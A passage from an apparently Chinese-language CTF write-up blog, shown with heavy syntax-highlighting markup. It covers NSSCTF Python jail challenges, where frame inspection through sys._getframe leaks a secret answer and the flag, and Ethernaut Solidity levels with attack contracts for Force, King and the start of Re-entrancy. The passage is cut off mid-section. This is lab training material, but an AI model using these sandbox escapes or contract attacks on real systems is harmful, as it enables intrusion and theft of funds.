  <span class="token operator">&lt;</span> ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\____<span class="token operator">/</span>  <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\____<span class="token operator">/</span>  <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\____<span class="token operator">/</span>Welcome to my guesser game!Can u guess the number? between <span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">9999999999999</span> <span class="token operator">></span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"sys"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__stdout__<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'sys'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_getframe<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>frame at <span class="token number">0x7ff87255d590</span><span class="token punctuation">,</span> <span class="token builtin">file</span> <span class="token string">'/home/ctf/./server.py'</span><span class="token punctuation">,</span> line <span class="token number">31</span><span class="token punctuation">,</span> code guesser<span class="token operator">></span>Guess game end!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现’/home/ctf/./server.py‘直接调用f_locals查看变量</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28864</span>  _       _    ____    _       _    ____    _       _    ____ <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>___ \  <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>___ \  <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>___ \ <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> __ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> __ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> __ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>__ <span class="token operator">&lt;</span>  <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>__ <span class="token operator">&lt;</span>  <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>__ <span class="token operator">&lt;</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span> ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span> ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span> ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\____<span class="token operator">/</span>  <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\____<span class="token operator">/</span>  <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\____<span class="token operator">/</span>Welcome to my guesser game!Can u guess the number? between <span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">9999999999999</span> <span class="token operator">></span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"sys"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__stdout__<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'sys'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_getframe<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>f_locals<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token string">'game_score'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'right_guesser_question_answer'</span><span class="token punctuation">:</span> <span class="token number">2500207681611</span><span class="token punctuation">,</span> <span class="token string">'challenge_original_stdout'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>_io<span class="token punctuation">.</span>TextIOWrapper name<span class="token operator">=</span><span class="token string">'&lt;stdout>'</span> mode<span class="token operator">=</span><span class="token string">'w'</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token operator">></span><span class="token punctuation">&#125;</span>Guess game end!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后构造payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'sys'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_getframe<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>f_locals<span class="token punctuation">[</span><span class="token string">"right_guesser_question_answer"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28864</span>  _       _    ____    _       _    ____    _       _    ____ <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>___ \  <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>___ \  <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>___ \ <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> __ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> __ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> __ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>__ <span class="token operator">&lt;</span>  <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>__ <span class="token operator">&lt;</span>  <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>__ <span class="token operator">&lt;</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span> ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span> ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span> ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\____<span class="token operator">/</span>  <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\____<span class="token operator">/</span>  <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\____<span class="token operator">/</span>Welcome to my guesser game!Can u guess the number? between <span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">9999999999999</span> <span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'sys'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_getframe<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>f_locals<span class="token punctuation">[</span><span class="token string">"right_guesser_question_answer"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>you are really <span class="token builtin">super</span> guesser!!!!NSSCTF<span class="token punctuation">&#123;</span>60ab0629<span class="token operator">-</span>81f1<span class="token operator">-</span>42cd<span class="token operator">-</span>9b23<span class="token operator">-</span>24fb58531aa5<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="calc_jail_beginner_level6"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level6"></a> calc_jail_beginner_level6</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28599</span>  _                _                           _       _ _   _                _   __ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">/</span> <span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span>_ <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span> '_ \ <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">/</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span>White <span class="token builtin">list</span> of audit hook <span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span> builtins<span class="token punctuation">.</span><span class="token builtin">input</span><span class="token punctuation">,</span>builtins<span class="token punctuation">.</span><span class="token builtin">input</span><span class="token operator">/</span>result<span class="token punctuation">,</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token builtin">compile</span>Some code of python jail<span class="token punctuation">:</span>  dict_global <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>      <span class="token keyword">try</span><span class="token punctuation">:</span>          input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>      <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token keyword">break</span>      <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'bye~~'</span><span class="token punctuation">)</span>          <span class="token keyword">continue</span>      <span class="token keyword">if</span> input_data <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>          <span class="token keyword">continue</span>      <span class="token keyword">try</span><span class="token punctuation">:</span>          complie_code <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">'&lt;string>'</span><span class="token punctuation">,</span> <span class="token string">'single'</span><span class="token punctuation">)</span>      <span class="token keyword">except</span> SyntaxError <span class="token keyword">as</span> err<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>          <span class="token keyword">continue</span>      <span class="token keyword">try</span><span class="token punctuation">:</span>          <span class="token keyword">exec</span><span class="token punctuation">(</span>complie_code<span class="token punctuation">,</span> dict_global<span class="token punctuation">)</span>      <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut</title>
      <link href="/2023/11/27/Ethernaut/"/>
      <url>/2023/11/27/Ethernaut/</url>
      
        <content type="html"><![CDATA[<h3 id="force"><a class="markdownIt-Anchor" href="#force"></a> Force</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Force</span> <span class="token punctuation">&#123;</span><span class="token comment">/*                   MEOW ?         /\_/\   /    ____/ o o \  /~____  =ø= / (______)__m_m)*/</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Hack</span><span class="token punctuation">&#123;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _owner<span class="token punctuation">)</span><span class="token keyword">payable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span> _owner<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="king"><a class="markdownIt-Anchor" href="#king"></a> King</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">King</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> king<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> prize<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>      king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> prize <span class="token operator">||</span> msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">payable</span><span class="token punctuation">(</span>king<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">_king</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> king<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求我们成为国王，并且不再改变。</p><h4 id="analyse"><a class="markdownIt-Anchor" href="#analyse"></a> Analyse</h4><p>然而成为国王需要我们msg.value 超过上个国王的prize，并且msg.sender == owner。显然第二个要求成立，但是当我们成为国王后，需要阻止别人超过我们。这时，我们发现receive函数是先转账，然后再修改成为国王的。因此，如果我们拒绝获得转账，那么就可以保持我们是国王了。</p><h4 id="attack"><a class="markdownIt-Anchor" href="#attack"></a> attack</h4><p>我们需要先得到上个国王的prize，只需运行King合约的prize。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">King</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> king<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> prize<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>      king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> prize <span class="token operator">||</span> msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">payable</span><span class="token punctuation">(</span>king<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">_king</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> king<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Hack</span><span class="token punctuation">&#123;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> target<span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> prize<span class="token operator">=</span> <span class="token function">King</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">prize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token builtin">bool</span> ok<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> prize<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>ok<span class="token punctuation">,</span><span class="token string">'call.failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//fallback() external payable&#123;</span>  <span class="token comment">//revert();</span>  <span class="token comment">//&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span><span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>该函数也就相当于什么的没有，即拒绝转账。</p><h3 id="re-entrancy"><a class="markdownIt-Anchor" href="#re-entrancy"></a> <strong>Re-entrancy</strong></h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.12</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'openzeppelin-contracts-06/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Reentrance</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _who<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_who<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span>_amount<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        _amount<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求盗取所有余额。</p><h4 id="analyse-2"><a class="markdownIt-Anchor" href="#analyse-2"></a> 